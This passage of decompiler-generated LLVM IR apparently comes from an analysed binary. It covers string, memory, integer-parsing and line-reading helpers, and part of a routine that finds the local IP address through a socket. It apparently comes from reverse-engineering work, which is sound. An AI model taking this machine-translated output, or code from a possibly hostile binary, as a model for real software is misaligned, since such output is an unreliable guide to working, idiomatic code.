  uselistorder i32 %v0_120d8, { 1, 0 }
  uselistorder i32 %v0_120b0, { 1, 0 }
  uselistorder i32 %v0_11fe8, { 1, 0 }
  uselistorder i32 %v0_11f78, { 1, 0 }
  uselistorder i32 %v0_11f34, { 1, 0 }
  uselistorder i32 %v0_11f14, { 1, 0 }
  uselistorder i32 %v0_11ed0, { 1, 0 }
  uselistorder i32 %v0_11e8c, { 1, 0 }
  uselistorder i32 %v0_11e6c, { 1, 0 }
  uselistorder i32 %v0_11e4c, { 1, 0 }
  uselistorder i32 %v0_11e04, { 1, 0 }
  uselistorder i32 %v0_11dc0, { 1, 0 }
  uselistorder i32 %v0_11da0, { 1, 0 }
  uselistorder i32 %v0_11d80, { 1, 0 }
  uselistorder i32 %v0_11d3c, { 1, 0 }
  uselistorder i32 %v0_11d18, { 1, 0 }
  uselistorder i32 %v0_11cf8, { 1, 0 }
  uselistorder i32 %v0_11cb4, { 1, 0 }
  uselistorder i32 %v0_11c90, { 1, 0 }
  uselistorder i32 %v0_11c6c, { 1, 0 }
  uselistorder i32 %v0_11c48, { 1, 0 }
  uselistorder i32 %v0_11bdc, { 1, 0 }
  uselistorder i32 %v0_11bb8, { 1, 0 }
  uselistorder i32 %v0_11b98, { 1, 0 }
  uselistorder i32 %v0_11b70, { 1, 0 }
  uselistorder i16 10, { 1, 0 }
  uselistorder i32 284, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32 29, { 0, 9, 1, 6, 2, 7, 3, 8, 10, 4, 5 }
  uselistorder i32 23, { 0, 11, 1, 12, 2, 13, 3, 14, 4, 8, 5, 9, 6, 10, 7, 15 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2718c.552 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_12494 = load i8, i8* %arg1, align 1
  %v2_12498 = icmp eq i8 %v3_12494, 0
  %v0_1249c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12498, i32 %v0_1249c)
  br label %dec_label_pc_124a4

dec_label_pc_124a4:                               ; preds = %dec_label_pc_124a4, %entry
  %v0_124a4 = phi i32 [ %v1_124a4, %dec_label_pc_124a4 ], [ 0, %entry ]
  %v1_124a4 = add i32 %v0_124a4, 1
  %v2_124a8 = add i32 %v1_124a4, %tmp
  %v3_124a8 = inttoptr i32 %v2_124a8 to i8*
  %v4_124a8 = load i8, i8* %v3_124a8, align 1
  %v6_124a8 = zext i8 %v4_124a8 to i32
  store i32 %v6_124a8, i32* @r3, align 4
  %v2_124ac = icmp eq i8 %v4_124a8, 0
  br i1 %v2_124ac, label %dec_label_pc_124b4, label %dec_label_pc_124a4

dec_label_pc_124b4:                               ; preds = %dec_label_pc_124a4
  ret i32 %v1_124a4
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v2_124b8 = load i8, i8* %arg1, align 1
  %v3_124b8 = zext i8 %v2_124b8 to i32
  %v2_124bc = icmp eq i8 %v2_124b8, 0
  br i1 %v2_124bc, label %bb, label %dec_label_pc_124c8

bb:                                               ; preds = %entry
  store i32 %v3_124b8, i32* @ip, align 4
  br label %dec_label_pc_124dc

dec_label_pc_124c8:                               ; preds = %entry
  br label %dec_label_pc_124cc

dec_label_pc_124cc:                               ; preds = %dec_label_pc_124cc, %dec_label_pc_124c8
  %v0_124cc = phi i32 [ %v1_124cc, %dec_label_pc_124cc ], [ 0, %dec_label_pc_124c8 ]
  %v1_124cc = add i32 %v0_124cc, 1
  store i32 %v1_124cc, i32* @ip, align 4
  %v2_124d0 = add i32 %v1_124cc, %tmp
  %v3_124d0 = inttoptr i32 %v2_124d0 to i8*
  %v4_124d0 = load i8, i8* %v3_124d0, align 1
  %v2_124d4 = icmp eq i8 %v4_124d0, 0
  br i1 %v2_124d4, label %dec_label_pc_124dc, label %dec_label_pc_124cc

dec_label_pc_124dc:                               ; preds = %dec_label_pc_124cc, %bb
  %v0_124dc = phi i32 [ %v3_124b8, %bb ], [ %v1_124cc, %dec_label_pc_124cc ]
  br label %dec_label_pc_124e8

dec_label_pc_124e4:                               ; preds = %dec_label_pc_124e8
  %v0_124e4 = load i32, i32* @r1, align 4
  %v1_124e4 = add i32 %v0_124e4, 1
  %v2_124e4 = inttoptr i32 %v1_124e4 to i8*
  %v3_124e4 = load i8, i8* %v2_124e4, align 1
  store i32 %v1_124e4, i32* @r1, align 4
  %v0_124e8.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_124e8

dec_label_pc_124e8:                               ; preds = %dec_label_pc_124dc, %dec_label_pc_124e4
  %v0_124f0.off0 = phi i8 [ %v2_124b8, %dec_label_pc_124dc ], [ %v3_124e4, %dec_label_pc_124e4 ]
  %v0_124e8 = phi i32 [ %v0_124dc, %dec_label_pc_124dc ], [ %v0_124e8.pr, %dec_label_pc_124e4 ]
  %v1_124e8 = add i32 %v0_124e8, -1
  store i32 %v1_124e8, i32* @r3, align 4
  %v3_124ec = icmp eq i32 %v0_124e8, 0
  %v2_124f0 = load i32, i32* @r0, align 4
  %v3_124f0 = inttoptr i32 %v2_124f0 to i8*
  store i8 %v0_124f0.off0, i8* %v3_124f0, align 1
  %v4_124f0 = load i32, i32* @r0, align 4
  %v5_124f0 = add i32 %v4_124f0, 1
  store i32 %v5_124f0, i32* @r0, align 4
  br i1 %v3_124ec, label %dec_label_pc_124f8, label %dec_label_pc_124e4

dec_label_pc_124f8:                               ; preds = %dec_label_pc_124e8
  %v0_124f8 = load i32, i32* @ip, align 4
  ret i32 %v0_124f8

; uselistorder directives
  uselistorder i32 %v0_124e8, { 1, 0 }
  uselistorder i32 %v1_124cc, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_124e8, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_12500 = icmp eq i32 %arg3, 0
  %v0_12504 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12500, i32 %v0_12504)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1250c

dec_label_pc_1250c:                               ; preds = %dec_label_pc_1250c, %entry
  %v0_1250c = phi i32 [ %v1_12514, %dec_label_pc_1250c ], [ 0, %entry ]
  %v2_1250c = add i32 %v0_1250c, %arg2
  %v3_1250c = inttoptr i32 %v2_1250c to i8*
  %v4_1250c = load i8, i8* %v3_1250c, align 1
  %v4_12510 = add i32 %v0_1250c, %arg1
  %v5_12510 = inttoptr i32 %v4_12510 to i8*
  store i8 %v4_1250c, i8* %v5_12510, align 1
  %v0_12514 = load i32, i32* %ip.global-to-local, align 4
  %v1_12514 = add i32 %v0_12514, 1
  store i32 %v1_12514, i32* %ip.global-to-local, align 4
  %v9_12518 = icmp eq i32 %v1_12514, %arg3
  br i1 %v9_12518, label %dec_label_pc_12520, label %dec_label_pc_1250c

dec_label_pc_12520:                               ; preds = %dec_label_pc_1250c
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_12514, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v2_12524 = icmp eq i32 %arg2, 0
  %v0_12528 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12524, i32 %v0_12528)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12530

dec_label_pc_12530:                               ; preds = %dec_label_pc_12530, %entry
  %v2_12534 = phi i32 [ %v1_12538, %dec_label_pc_12530 ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v4_12534 = add i32 %v2_12534, %arg1
  %v5_12534 = inttoptr i32 %v4_12534 to i8*
  store i8 0, i8* %v5_12534, align 1
  %v0_12538 = load i32, i32* %r2.global-to-local, align 4
  %v1_12538 = add i32 %v0_12538, 1
  store i32 %v1_12538, i32* %r2.global-to-local, align 4
  %v9_1253c = icmp eq i32 %v1_12538, %arg2
  br i1 %v9_1253c, label %dec_label_pc_12544, label %dec_label_pc_12530

dec_label_pc_12544:                               ; preds = %dec_label_pc_12530
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_12538, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_1255c = icmp sgt i32 %arg4, %arg2
  br i1 %v7_1255c, label %dec_label_pc_12564, label %dec_label_pc_1256c

dec_label_pc_12564:                               ; preds = %dec_label_pc_12580, %dec_label_pc_1256c, %entry, %dec_label_pc_125ac
  %storemerge = phi i32 [ %v1_125ac, %dec_label_pc_125ac ], [ -1, %entry ], [ -1, %dec_label_pc_1256c ], [ -1, %dec_label_pc_12580 ]
  ret i32 %storemerge

dec_label_pc_1256c:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_12564, label %dec_label_pc_12574

dec_label_pc_12574:                               ; preds = %dec_label_pc_1256c
  br label %dec_label_pc_1258c

dec_label_pc_12580:                               ; preds = %bb, %dec_label_pc_125a0
  %v1_1258c3 = phi i32 [ %v1_125a0, %dec_label_pc_125a0 ], [ 0, %bb ]
  %v1_12580 = add i32 %v0_125ac, 1
  %v9_12584 = icmp eq i32 %v1_12580, %arg2
  br i1 %v9_12584, label %dec_label_pc_12564, label %dec_label_pc_1258c

dec_label_pc_1258c:                               ; preds = %dec_label_pc_12580, %dec_label_pc_12574
  %v0_125ac = phi i32 [ %v1_12580, %dec_label_pc_12580 ], [ 0, %dec_label_pc_12574 ]
  %v1_1258c = phi i32 [ %v1_1258c3, %dec_label_pc_12580 ], [ 0, %dec_label_pc_12574 ]
  %v2_1258c = add i32 %v1_1258c, %arg3
  %v3_1258c = inttoptr i32 %v2_1258c to i8*
  %v4_1258c = load i8, i8* %v3_1258c, align 1
  %v2_12590 = add i32 %v0_125ac, %arg1
  %v3_12590 = inttoptr i32 %v2_12590 to i8*
  %v4_12590 = load i8, i8* %v3_12590, align 1
  %v9_12594 = icmp eq i8 %v4_12590, %v4_1258c
  br i1 %v9_12594, label %dec_label_pc_125a0, label %bb

bb:                                               ; preds = %dec_label_pc_1258c
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_12580

dec_label_pc_125a0:                               ; preds = %dec_label_pc_1258c
  %v1_125a0 = add i32 %v1_1258c, 1
  store i32 %v1_125a0, i32* @ip, align 4
  %v9_125a4 = icmp eq i32 %v1_125a0, %arg4
  br i1 %v9_125a4, label %dec_label_pc_125ac, label %dec_label_pc_12580

dec_label_pc_125ac:                               ; preds = %dec_label_pc_125a0
  %v1_125ac = add i32 %v0_125ac, 1
  br label %dec_label_pc_12564

; uselistorder directives
  uselistorder i32 %v1_125a0, { 1, 2, 0 }
  uselistorder i32 %v1_1258c, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12580, { 1, 0 }
  uselistorder label %dec_label_pc_12564, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_125c4

dec_label_pc_125c4:                               ; preds = %.thread, %dec_label_pc_125d8, %bb, %entry
  %v0_125c4 = phi i32 [ %tmp, %entry ], [ %v5_125c4, %bb ], [ %v5_125c4, %dec_label_pc_125d8 ], [ %v5_125c4, %.thread ]
  %v1_125c4 = inttoptr i32 %v0_125c4 to i8*
  %v2_125c4 = load i8, i8* %v1_125c4, align 1
  %v5_125c4 = add i32 %v0_125c4, 1
  %v7_125c8 = icmp eq i8 %v2_125c4, 9
  br i1 %v7_125c8, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_125c4
  br label %dec_label_pc_125c4

bb:                                               ; preds = %dec_label_pc_125c4
  %v8_125cc = icmp eq i8 %v2_125c4, 32
  br i1 %v8_125cc, label %dec_label_pc_125c4, label %dec_label_pc_125d8

dec_label_pc_125d8:                               ; preds = %bb
  %v7_125d8 = icmp eq i8 %v2_125c4, 10
  br i1 %v7_125d8, label %dec_label_pc_125c4, label %dec_label_pc_125e0

dec_label_pc_125e0:                               ; preds = %dec_label_pc_125d8
  %v7_125e0 = icmp eq i8 %v2_125c4, 45
  br i1 %v7_125e0, label %dec_label_pc_126d0, label %dec_label_pc_125e8

dec_label_pc_125e8:                               ; preds = %dec_label_pc_125e0
  %v7_125e8 = icmp eq i8 %v2_125c4, 43
  br i1 %v7_125e8, label %bb54, label %dec_label_pc_125f8

bb54:                                             ; preds = %dec_label_pc_125e8
  %v2_125ec = inttoptr i32 %v5_125c4 to i8*
  %v3_125ec = load i8, i8* %v2_125ec, align 1
  %v6_125ec = add i32 %v0_125c4, 2
  br label %dec_label_pc_125f8

dec_label_pc_125f8:                               ; preds = %bb54, %dec_label_pc_125e8, %dec_label_pc_126d0
  %v1_126a039 = phi i32 [ %v5_126d0, %dec_label_pc_126d0 ], [ %v5_125c4, %dec_label_pc_125e8 ], [ %v6_125ec, %bb54 ]
  %v0_1262010.in = phi i8 [ %v2_126d0, %dec_label_pc_126d0 ], [ %v2_125c4, %dec_label_pc_125e8 ], [ %v3_125ec, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_126d0 ], [ 2147483647, %dec_label_pc_125e8 ], [ 2147483647, %bb54 ]
  %v0_126e0 = phi i32 [ 1, %dec_label_pc_126d0 ], [ 0, %dec_label_pc_125e8 ], [ 0, %bb54 ]
  %v2_12600 = udiv i32 %storemerge1, %arg2
  %v3_12600 = urem i32 %storemerge1, %arg2
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_12620.outer

dec_label_pc_12620.outer:                         ; preds = %.thread5, %dec_label_pc_125f8
  %v1_126a0.ph = phi i32 [ %v6_126a0, %.thread5 ], [ %v1_126a039, %dec_label_pc_125f8 ]
  %v2_1269c.ph = phi i32 [ %v5_1269c, %.thread5 ], [ 0, %dec_label_pc_125f8 ]
  %v1_12660.ph.in = phi i8 [ %v3_126a0, %.thread5 ], [ %v0_1262010.in, %dec_label_pc_125f8 ]
  %v1_12678.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_125f8 ]
  %v3_1266c = icmp uge i32 %v2_1269c.ph, %v2_12600
  %v9_1266c = icmp eq i32 %v2_1269c.ph, %v2_12600
  %v2_12670 = xor i1 %v3_1266c, true
  %v3_12670 = or i1 %v9_1266c, %v2_12670
  %v2_12674 = xor i1 %v9_1266c, true
  %v3_12674 = and i1 %v3_1266c, %v2_12674
  %v2_12694 = icmp eq i1 %v9_1266c, false
  br label %dec_label_pc_12620

dec_label_pc_12620:                               ; preds = %dec_label_pc_12620.outer, %dec_label_pc_126a8
  %v1_126a0 = phi i32 [ %v5_126a8, %dec_label_pc_126a8 ], [ %v1_126a0.ph, %dec_label_pc_12620.outer ]
  %v1_12678 = phi i32 [ -1, %dec_label_pc_126a8 ], [ %v1_12678.ph, %dec_label_pc_12620.outer ]
  %v1_12660.in = phi i8 [ %v2_126a8, %dec_label_pc_126a8 ], [ %v1_12660.ph.in, %dec_label_pc_12620.outer ]
  %v1_12660 = zext i8 %v1_12660.in to i32
  %v1_12620 = urem i32 %v1_12660, 256
  %v1_12624 = add nsw i32 %v1_12620, -48
  %v1_1262c = add nsw i32 %v1_12620, -97
  %v1_12630 = add nsw i32 %v1_12660, -48
  %v1_12634 = add nsw i32 %v1_12620, -65
  %tmp87 = icmp ult i32 %v1_12624, 10
  br i1 %tmp87, label %dec_label_pc_12664, label %dec_label_pc_1263c

dec_label_pc_1263c:                               ; preds = %dec_label_pc_12620
  %v2_1263c = icmp ugt i32 %v1_12634, 24
  %v7_1263c = icmp eq i32 %v1_12634, 25
  %v2_12640 = xor i1 %v7_1263c, true
  %v3_12640 = and i1 %v2_1263c, %v2_12640
  br i1 %v3_12640, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_1263c
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_1263c, %bb55
  %v0_1265415 = phi i32 [ %v1_12630, %dec_label_pc_1263c ], [ 0, %bb55 ]
  %v2_12644 = xor i1 %v2_1263c, true
  %v3_12644 = or i1 %v7_1263c, %v2_12644
  br i1 %v3_12644, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_12654 = phi i32 [ %v0_1265415, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_12640, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_1264c = icmp ugt i32 %v1_1262c, 24
  %v11_1264c = icmp eq i32 %v1_1262c, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_12650 = phi i1 [ %v7_1263c, %bb58 ], [ %v11_1264c, %bb59 ]
  %v0_12650 = phi i1 [ %v2_1263c, %bb58 ], [ %v6_1264c, %bb59 ]
  %v2_12650 = xor i1 %v1_12650, true
  %v3_12650 = and i1 %v0_12650, %v2_12650
  br i1 %v3_12650, label %dec_label_pc_126b4, label %dec_label_pc_12654

dec_label_pc_12654:                               ; preds = %bb60
  %v2_12654 = icmp eq i32 %v0_12654, 0
  %. = select i1 %v2_12654, i32 87, i32 55
  %v2_12660 = sub nsw i32 %v1_12660, %.
  br label %dec_label_pc_12664

dec_label_pc_12664:                               ; preds = %dec_label_pc_12620, %dec_label_pc_12654
  %v0_1267833 = phi i32 [ %v1_12634, %dec_label_pc_12620 ], [ %., %dec_label_pc_12654 ]
  %v3_1269c = phi i32 [ %v1_12630, %dec_label_pc_12620 ], [ %v2_12660, %dec_label_pc_12654 ]
  %v2_12664 = sub i32 %v3_1269c, %arg2
  %v4_12664 = xor i32 %v3_1269c, %arg2
  %v5_12664 = xor i32 %v2_12664, %v3_1269c
  %v6_12664 = and i32 %v5_12664, %v4_12664
  %v7_12664 = icmp slt i32 %v6_12664, 0
  %v8_12664 = icmp slt i32 %v2_12664, 0
  %v2_12668 = xor i1 %v8_12664, %v7_12664
  br i1 %v2_12668, label %dec_label_pc_1266c, label %dec_label_pc_126b4

dec_label_pc_1266c:                               ; preds = %dec_label_pc_12664
  br i1 %v3_12670, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_1266c
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_1266c, %bb63
  %v0_1267832 = phi i32 [ %v0_1267833, %dec_label_pc_1266c ], [ 0, %bb63 ]
  br i1 %v3_12674, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_12678 = phi i32 [ %v0_1267832, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_12678, 0
  %v4_12678 = zext i1 %tmp88 to i32
  %v5_12678 = or i32 %v0_12678, %v4_12678
  %v7_12678 = icmp eq i32 %v5_12678, 0
  br i1 %v7_12678, label %dec_label_pc_12680, label %dec_label_pc_126a8

dec_label_pc_12680:                               ; preds = %bb66
  %v2_1268c = sub i32 %v3_1269c, %v3_12600
  %v4_1268c = xor i32 %v3_1269c, %v3_12600
  %v5_1268c = xor i32 %v2_1268c, %v3_1269c
  %v6_1268c = and i32 %v5_1268c, %v4_1268c
  %v7_1268c = icmp slt i32 %v6_1268c, 0
  %v8_1268c = icmp slt i32 %v2_1268c, 0
  %v9_1268c = icmp eq i32 %v3_1269c, %v3_12600
  %v3_12690 = xor i1 %v8_1268c, %v7_1268c
  %v4_12690 = or i1 %v9_1268c, %v3_12690
  br i1 %v4_12690, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_12680
  store i32 1, i32* @ip, align 4
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_12680
  store i32 1, i32* @ip, align 4
  br i1 %v2_12694, label %.thread5, label %dec_label_pc_126a8

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_1269c = mul i32 %v2_1269c.ph, %arg2
  %v5_1269c = add i32 %v3_1269c, %v4_1269c
  %v2_126a0 = inttoptr i32 %v1_126a0 to i8*
  %v3_126a0 = load i8, i8* %v2_126a0, align 1
  %v6_126a0 = add i32 %v1_126a0, 1
  br label %dec_label_pc_12620.outer

dec_label_pc_126a8:                               ; preds = %thread-pre-split, %bb66
  %v1_126a8 = inttoptr i32 %v1_126a0 to i8*
  %v2_126a8 = load i8, i8* %v1_126a8, align 1
  %v5_126a8 = add i32 %v1_126a0, 1
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_12620

dec_label_pc_126b4:                               ; preds = %dec_label_pc_12664, %bb60
  %v1_126b4 = icmp slt i32 %v1_12678, 0
  %v2_126e0 = icmp eq i32 %v0_126e0, 0
  br i1 %v1_126b4, label %dec_label_pc_126e0, label %dec_label_pc_126bc

dec_label_pc_126bc:                               ; preds = %dec_label_pc_126b4
  br i1 %v2_126e0, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_126bc
  %v2_126c0 = sub i32 0, %v2_1269c.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_126bc, %bb69
  %v1_126cc = phi i32 [ -2147483648, %bb71 ], [ %v2_1269c.ph, %dec_label_pc_126bc ], [ %v2_126c0, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_126cc

dec_label_pc_126d0:                               ; preds = %dec_label_pc_125e0
  %v1_126d0 = inttoptr i32 %v5_125c4 to i8*
  %v2_126d0 = load i8, i8* %v1_126d0, align 1
  %v5_126d0 = add i32 %v0_125c4, 2
  br label %dec_label_pc_125f8

dec_label_pc_126e0:                               ; preds = %dec_label_pc_126b4
  br i1 %v2_126e0, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_126e0
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_126e0
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_126e0, { 1, 0 }
  uselistorder i32 %v2_1268c, { 1, 0 }
  uselistorder i32 %v2_12664, { 1, 0 }
  uselistorder i32 %v3_1269c, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_1263c, { 1, 2, 0 }
  uselistorder i1 %v2_1263c, { 1, 0, 2 }
  uselistorder i32 %v1_12620, { 1, 2, 0 }
  uselistorder i32 %v1_12660, { 1, 0, 2 }
  uselistorder i32 %v1_12678, { 1, 0 }
  uselistorder i32 %v1_126a0, { 2, 3, 1, 0 }
  uselistorder i1 %v9_1266c, { 1, 0, 2 }
  uselistorder i1 %v3_1266c, { 1, 0 }
  uselistorder i32 %v2_1269c.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_12600, { 1, 0, 2 }
  uselistorder i32 %v2_12600, { 1, 0 }
  uselistorder i32 %v5_125c4, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_125c4, { 0, 1, 3, 2 }
  uselistorder i32 25, { 10, 11, 0, 9, 1, 6, 2, 7, 3, 8, 5, 4, 12 }
  uselistorder i8 32, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i8 9, { 4, 0, 3, 1, 2 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_12664, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_12620, { 1, 0 }
  uselistorder label %dec_label_pc_125f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_125c4, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_126f0 = load i32, i32* @r4, align 4
  store i32 %v3_126f0, i32* %stack_var_-24, align 4
  %v6_126f0 = load i32, i32* @r5, align 4
  %v9_126f0 = load i32, i32* @r6, align 4
  %v12_126f0 = load i32, i32* @r7, align 4
  %v15_126f0 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12708

dec_label_pc_12708:                               ; preds = %dec_label_pc_1272c.dec_label_pc_12708_crit_edge, %entry
  %v0_1270c = phi i32 [ %v0_1270c.pre, %dec_label_pc_1272c.dec_label_pc_12708_crit_edge ], [ %arg3, %entry ]
  %v0_12708 = phi i32 [ %v5_1272c, %dec_label_pc_1272c.dec_label_pc_12708_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_12708, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_12714 = call i32 @__libc_read(i32 %v0_1270c)
  %v7_12718 = icmp eq i32 %v1_12714, 1
  %v0_12720 = load i32, i32* @r5, align 4
  br i1 %v7_12718, label %dec_label_pc_12720, label %dec_label_pc_12738

dec_label_pc_12720:                               ; preds = %dec_label_pc_12708
  %v1_12720 = add i32 %v0_12720, 1
  store i32 %v1_12720, i32* @r5, align 4
  %v1_12724 = load i32, i32* @r8, align 4
  %v6_12728 = icmp slt i32 %v1_12720, %v1_12724
  br i1 %v6_12728, label %dec_label_pc_1272c, label %.loopexit

dec_label_pc_1272c:                               ; preds = %dec_label_pc_12720
  %v0_1272c = load i32, i32* @r4, align 4
  %v1_1272c = inttoptr i32 %v0_1272c to i8*
  %v2_1272c = load i8, i8* %v1_1272c, align 1
  %v3_1272c = zext i8 %v2_1272c to i32
  store i32 %v3_1272c, i32* @r3, align 4
  %v5_1272c = add i32 %v0_1272c, 1
  store i32 %v5_1272c, i32* @r4, align 4
  %v7_12730 = icmp eq i8 %v2_1272c, 10
  br i1 %v7_12730, label %dec_label_pc_12738, label %dec_label_pc_1272c.dec_label_pc_12708_crit_edge

dec_label_pc_1272c.dec_label_pc_12708_crit_edge:  ; preds = %dec_label_pc_1272c
  %v0_1270c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12708

dec_label_pc_12738:                               ; preds = %dec_label_pc_12708, %dec_label_pc_1272c
  %v0_12738 = phi i32 [ %v1_12720, %dec_label_pc_1272c ], [ %v0_12720, %dec_label_pc_12708 ]
  %v2_12738 = icmp eq i32 %v0_12738, 0
  br i1 %v2_12738, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_12738
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_12720, %dec_label_pc_12738, %bb
  %v0_12740 = load i32, i32* @r7, align 4
  %v2_12744 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12744, i32* @r4, align 4
  store i32 %v6_126f0, i32* @r5, align 4
  store i32 %v9_126f0, i32* @r6, align 4
  store i32 %v12_126f0, i32* @r7, align 4
  store i32 %v15_126f0, i32* @r8, align 4
  ret i32 %v0_12740

; uselistorder directives
  uselistorder i32 %v5_1272c, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12738, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1274c = load i32, i32* @r4, align 4
  %v6_1274c = load i32, i32* @r5, align 4
  %v9_1274c = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_1275c = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_12764 = inttoptr i32 %v0_1275c to i32*
  store i32 0, i32* %v2_12764, align 4
  %v0_12770 = load i32, i32* %r4.global-to-local, align 4
  %v3_12774 = call i32 @socket(i32 2, i32 2, i32 %v0_12770)
  %v7_12778 = icmp eq i32 %v3_12774, -1
  store i32 %v3_12774, i32* @r5, align 4
  br i1 %v7_12778, label %bb, label %dec_label_pc_12788

bb:                                               ; preds = %entry
  %v1_12780 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_127d4

dec_label_pc_12788:                               ; preds = %entry
  %v2_12794 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_12794, i32* @r4, align 4
  %v0_127a0 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_127b4 = call i32 @__libc_connect(i32 %v3_12774, i32 %v2_12794, i32 %v0_127a0)
  store i32 %v2_12794, i32* @r1, align 4
  %v2_127bc = ptrtoint i32* %stack_var_-20 to i32
  %v0_127c0 = load i32, i32* @r5, align 4
  %v3_127c4 = call i32 @__GI_getsockname(i32 %v0_127c0, i32 %v2_12794, i32 %v2_127bc)
  %v0_127c8 = load i32, i32* @r5, align 4
